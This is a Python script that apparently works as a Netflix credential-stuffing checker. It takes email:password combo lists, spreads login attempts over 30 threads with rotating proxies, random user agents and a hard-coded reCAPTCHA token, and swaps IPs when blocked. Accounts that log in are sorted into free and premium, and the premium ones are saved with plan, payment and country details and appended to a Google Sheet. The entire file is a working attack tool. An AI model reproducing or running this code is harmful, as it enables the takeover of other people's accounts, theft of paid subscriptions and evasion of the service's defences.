import requests
from bs4 import BeautifulSoup
import sys
import time
import datetime
import queue
import threading
import random
import subprocess
import code
import json

import pickle
import os.path
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request


HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

free = 0
pre = 0
count = 1
q = queue.Queue()
lock = []
availabel = []
ip_dict = {}
thrds = 30
MAX_PROXY = 0
MAX_AC = 6
totalLoadedAcs = 0
statusTimeOut = 60

if (len(sys.argv)>=3):
    thrds= int(sys.argv[3])

input_file=sys.argv[1]
output_file_free = "NETFlixAc_Free_"+datetime.datetime.now().strftime("%d-%h-%H-%M")
output_file_paid = "NETFlixAc_Premium_"+datetime.datetime.now().strftime("%d-%h-%H-%M")
countFile = "."+sys.argv[0]+"_"+input_file+"_count"
proxy_file = sys.argv[2]
statusFile_name = "nf.status"
loginURL="https://www.netflix.com/Login"
authURL='https://www.netflix.com/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount'

SAMPLE_SPREADSHEET_ID = '1EptR91arylu3oPpRQT0RVQjFi73xyYt2YgPuYdNCitU'
SAMPLE_RANGE_NAME = 'NF_RAW!A1:E'


fi = open(input_file,'r',errors='ignore')




def writeToGoogle(cred,subs,payment,country):
    try:
        checkedOn = datetime.datetime.now().strftime("%d-%h-%y")
        creds = None
        if os.path.exists('token.pickle'):
            with open('token.pickle', 'rb') as token:
                creds = pickle.load(token)

        service = build('sheets', 'v4', credentials=creds)
        values = [[cred,subs,country,checkedOn,payment]]
        body = {'values': values}
        result = service.spreadsheets().values().append(spreadsheetId=SAMPLE_SPREADSHEET_ID, range=SAMPLE_RANGE_NAME, valueInputOption="RAW", body=body).execute()
        print('{0} cells added'.format(result.get('updates').get('updatedCells')))
    except:
        print("ni pta google")


def get_ua():
    ua=['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:48.0) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36']
    ran = random.randint(0,len(ua)-1)
    return ua[ran]

def loadProxies():
    global MAX_PROXY
    global lock
    global availabel
    d = open(proxy_file,'r')
    counter = 0
    for i in d.readlines():
        ip_dict[counter]=i.strip()
        lock.append(0)
        availabel.append(1)
        counter+=1
    if len(ip_dict) == 0:
        MAX_PROXY = 0
        ip_dict[counter]=""
        lock.append(0)
        availabel.append(1)
    else:
        MAX_PROXY = len(ip_dict)-1
    print("Loaded "+str(counter)+" Proxies")

def loadQ():
    global count
    global totalLoadedAcs
    try:
        c = open(countFile,"r")
        cl = c.readline().strip()
        count = int(cl)
        for i in range(int(cl)):
            totalLoadedAcs+=1
            fi.readline()
    except:
        print("No Resume File Found")
    line = fi.readline();
    while len(line):
        q.put(line)
        totalLoadedAcs+=1
        line = fi.readline().strip()
    fi.close()

def free_ip(Tnum):
    global availabel
    global ip_dict
    rand = 0
    while True:
        rand = random.randint(0,MAX_PROXY)
        if availabel[rand] == 1: # 0 and availabel[rand] <= MAX_AC:
            # print("checked Acss in if "+str(availabel[rand]))
            # availabel[rand]+=1
            break
    #     elif availabel[rand] == (MAX_AC+1):
    #         print(str(MAX_AC)+" AC Checked from ip")
    #         # availabel[rand]=0
    #         # time.sleep(5)
    #         ban_ip(rand)
    return ip_dict[rand],rand


def get_proxy(Tname):
    if MAX_PROXY == 0:
        return "",0
    ip,container = free_ip(int(Tname))
    proxy = {"http":"http://"+ip,
            "https":"http://"+ip}
    return proxy,container

def countLoc():
    global count
    count = count+1
    f2 = open(countFile,'w')
    f2.write(str(count))
    f2.close()

def writeFree(cred1):
    f1 = open(output_file_free,'a')
    f1.write(cred1+"\n")
    f1.close()

def ban_ip(container):
    global availabel;
    global ip_dict
    availabel[container] = 0
    print(ip_dict[container]+"  Blocked ")
    lock[container] += 1    ### Setting Container offset
    if lock[container] == 1:
        unban_ip(container)
    else:
        print("Changing IP")

def unban_ip(container):
    print("first Thread Unblocking ")
    container_nm = str(container+1)
    print("Calling process for ip "+str(ip_dict[container]))
    res = subprocess.check_output(["change_tp.sh",container_nm])
    for line in res.splitlines():
        print(line)
    lock[container] = 0
    availabel[container] = 1
    print("unblocked")

def writePaid(cred1,subs,payment,country):
    template = cred1+" | Subscription: "+subs+" | Payment: "+payment+" | Country: "+country
    f1 = open(output_file_paid,'a')
    f1.write(template+"\n")
    f1.close()


def checkSub(page):
    try:
        if "No streaming plan" in page.text:
            return "FREE","",""
        else:
            pageText = str(page.text)
            countryS = pageText.find('countryOfSignup')
            startSub=pageText.find('currentPlanName')+18
            endSub=startSub+pageText[pageText.find('currentPlanName')+18:].find('"')
            countryOfSignup = pageText[countryS+18:countryS+20]
            bs1 = BeautifulSoup(page.text,features="html.parser")
            sub = str(bs1.find('b').text)
            payment = str(bs1.find('span',attrs={"class":"text-payment"}).text)
            txt = str(bs1.text)
            country_loc = txt.find('country')
            country = txt[(country_loc+10):(country_loc+12)]
            sub = pageText[startSub:endSub]
            return sub,payment,countryOfSignup
    except:
        return "Error","",""

def statusUpdate(cred, subs,container,id):
    template =""
    lis = ["Subscription","Error"]
    blue = ["FREE","Premium"]
    if id == 0:
        color = OKBLUE
    else:
        color = FAIL
    template = cred+" | "+color+lis[id]+ENDC+": "+subs+" | COUNTS= Total:"+str(count)+" Free:"+WARNING+str(free)+ENDC+" Premium:"+WARNING+str(pre)+ENDC+" ~ Proxy: "+str(ip_dict[container])+" ++Running Threads = "+str(threading.active_count())
    print(template)

def writeToFile(cred,subs,payment,country):
    global free
    global pre
    if subs == "FREE" or subs == "Error":
        writeFree(cred)
        free+=1
    else :
        writePaid(cred,subs,payment,country)
        writeToGoogle(cred,subs,payment,country)
        pre+=1


class ThreadC(threading.Thread):
    def __init__(self,q,name):
        threading.Thread.__init__(self)
        self.queue = q
        self.name = name
    def run(self):
        while not q.empty():
            try:
                cred = q.get().strip()
                un=cred.split(":")[0]
                pas=cred.split(":")[1]
                r = requests.Session()
                time.sleep(3)
                proxy,container= get_proxy(self.name)
                r.proxies = proxy
                ua = get_ua()
                headv1={'Host': 'www.netflix.com', 'Accept-Encoding': 'gzip, deflate', 'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'}
                r1 = r.get(loginURL,headers=headv1,timeout=30)
                if "Email or phone number" in r1.text:
                    bs = BeautifulSoup(r1.text,features="html.parser")
                    parsed_token_raw = bs.body.find('input',attrs={'name':'authURL'})
                    authTok = parsed_token_raw.get('value')
                    payload = "authURL="+authTok+"%3d&email="+un+"&password="+pas+"&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&rememberMe=True&flow=websiteSignUp&mode=login&action=loginAction&nextPage=https%3A%2F%2Fwww.netflix.com%2FYourAccount&showPassword="
                    payload1 = "userLoginId="+un+"&password="+pas+"&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode%2CrecaptchaResponseToken%2CrecaptchaError%2CrecaptchaResponseTime&authURL="+authTok+"%3D&nextPage=https%3A%2F%2Fwww.netflix.com%2Fyouraccount&showPassword=&countryCode=%2B91&countryIsoCode=IN&recaptchaResponseToken=03AGdBq24uO_oGO-fiaYQx4ZV4S2UhDoj01FRIYVRc09onOcqoitl7CeOx4Q9pC0XuihG5Jjy4aqzxEzRopsqLFBO-p223eVcXins6PaM2_4YVEjTsHRGTC1xfmzhTF2LeRkt62KAQ_mzyPj6B2yk4eqJM_BSWNDQd0ZN9i2P6FmKu2NVELVOoMHvs55yQcDy_mzEfLub8EE_aElwwpA6B4fXfJn8cI7kH4mqAlWuEXrWHfzRgdS06rkJko-VgMXWnTtTUKmRzytni-eJDnLTf7jEen2DXcsI7rM1fawknVvP1cskGbTo-uCDiKWCU5v_iGWt302TfN1KhbjNsIUnFF18VktnQ24__l9QOIHWLvPvZeVZYI7Pk-zDwmG3sh2uMTCkQqASLBQGet6GnWW3Iq8Ysaz5yQcGEdviWKctL-W_sXfwC8HZCiRoKCZaaaEQFxhdGeH0cJySORla4IaPFHwxpnsl9slfEtLU9V8iGugOwIlX4Yqh5ZUsWPpaVNGzTBWlgyro64q0wIlNo8KD32TNJ4-8XbSlQ3va4EnuE8cYSjVMUKW1M_WC5inlHowtQec7v06hP_BOCFY3NieV8SxBjso19xWqpImyt8Ha6YntXoMNmHrri6X061O7F8hyGsWXQwBYXOg6U5X7mdAkR_Il0lfk9820sADUQEBggn6IwpRs4z48gCQIjFHGC5GTt9sDLiHt2NYmR9GOVhmFDIZ7wbUEy7jAydqWS5Uc1XjF7-IMJxtFtM8OLqXkgK1Zzlse_03bFXMHddAa5oYG6bqH4YXj65pz1ClZg-0CBY5BEN0CahFCf-oYntySFojEaHhYk2jIz0TWG-uEz7p4yF8iD6BILvc3iaNbbiWnu6nqMi340SXmt-SuFmDU4Yaq1AtRkUjyB8sZ6FBfnPDs8XO6SI1l-qivf74N1-0eKMB8AuuJ86MrFYFJoYGpbeTarfRgnKdlyV5do2oGxx89oZClA1WSsSgvskpExbwDYUDL-iHEooXXM5n9HnWyY6wowHQW06k7EL2ANDgAtVecsWX1DqZhyjshh3ed8xPCUa11YBirdZ_fk7d90w0erhVi_dhmFFWosSoEgj5KMQ0JkDz4_M9qedI8c61E_LAdIhSd7OAJXFV54XflPPiLlfVJmb6_XSJUxKwz7naZuRxKvqfQueSaRqtSNQE0HqMXyKxXAdxvu2N1o9d3MSFOXuTt74MZxzIddDTokfIXpqKYRDmP5WWALpt-MjtKKggl9DlQeJmJQUwpPBAPD-InGq3F8AEESQKWLEo6z26K8SInKLGo6-9KxKQaSKKjsOhfvKi3Uw8jYnlJzvuH35-x5vJyco-DuyY7JFO4pI3oj271Jy1O6HErKq5EQBjWkfPLkvqK4sUqjK-fsDE_efq_yfIuHGKxz90MQ2En0SMJ6Zs6lE-7VP7o1Gp_DoA&recaptchaResponseTime=422"
                    headv2={
                        'Host': 'www.netflix.com',
                        'Accept-Encoding': 'gzip, deflate',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': ua,
                        'Referer': 'https://www.netflix.com/login',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
                        }
                    r1  = r.post(authURL,headers=headv2,data=payload,timeout=30)
                    print(r1.text)
                    if "Incorrect password" in r1.text:
                        statusUpdate(cred,"Password Incorrect",container,1)
                        countLoc()
                    elif "locale" in r1.url:
                        if un in r1.text:
                            subs,payment,country = checkSub(r1)
                            statusUpdate(cred,subs,container,0)
                            writeToFile(cred,subs,payment,country)
                            countLoc()
                            if subs != "FREE":
                                ban_ip(container)
                    elif "Sorry, we can't find an account with this email address" in r1.text:
                        statusUpdate(cred,"No Account Found",container,1)
                        countLoc()
                    elif "something went wrong" in r1.text:
                        statusUpdate(cred,"Somthing Went Wrong")
                        q.put(cred)
                        ban_ip(container)
                    elif "We are having technical difficulties and are actively working on a fix" in r1.text:
                        statusUpdate(cred,"Technical Difficulties",container,1)
                        q.put(cred)
                        ban_ip(container)
                    else:
                        q.put(cred)
                    self.queue.task_done()
                else:
                    print("Extra Else Called"+" [Proxy Using "+r.proxies['http']+"]")
                    q.put(cred)
                    self.queue.task_done()
                    ban_ip(container)   #Baning IP
            except:
                print("TIMEOUT OCCURED WAITING")
                print("Unexpected error:", sys.exc_info())
                time.sleep(2)
                q.put(cred)
                self.queue.task_done()
def statusFile():
    global totalLoadedAcs
    global pre
    global free
    global count
    global statusTimeOut
    global statusFile_name
    prevPremium = 0
    prevCount = count
    prevHourCount = count
    prevHourEntry = 0
    preCountRate = 0
    startingHour = datetime.datetime.now().strftime("%H")
    startingTime = time.time()
    countWhenStarting = count
    prevCountRate = 0
    premiumPrevHour = 0
    while True:
        if startingHour != datetime.datetime.now().strftime("%H"):
            startingHour = datetime.datetime.now().strftime("%H")
            prevHourEntry = count - prevHourCount
            prevHourCount = count
            premiumPrevHour = pre - prevPremium
            prevPremium = pre
        runningTime = int((time.time() - startingTime)/60)
        template = "Total: "+WARNING+str(totalLoadedAcs)+ENDC+" | Checked(total/starting): "+WARNING+str(count)+"/"+str(count - countWhenStarting)+ENDC+" | Premium: "+OKBLUE+str(pre)+ENDC+" | Free: "+WARNING+str(free)+ENDC+"\n"
        templateRate = "Running Time: "+WARNING+str(runningTime)+ENDC+" | Checking Rate(ph/pto): "+WARNING+str(prevHourEntry)+"/"+str(prevCountRate)+ENDC+" | Premium Prev Hour: "+OKBLUE+str(premiumPrevHour)+ENDC+"\n\n"
        f_statusFile = open(statusFile_name,'w')
        f_statusFile.write(template+templateRate)
        f_statusFile.close()
        time.sleep(statusTimeOut)
        prevCountRate = count - prevCount
        prevCount = count

def main():
    loadQ()
    loadProxies()
    for i in range(thrds):
        t = ThreadC(q,str(i))
        t.start()
    timeS = threading.Thread(target=statusFile).start()
    q.join()

main()
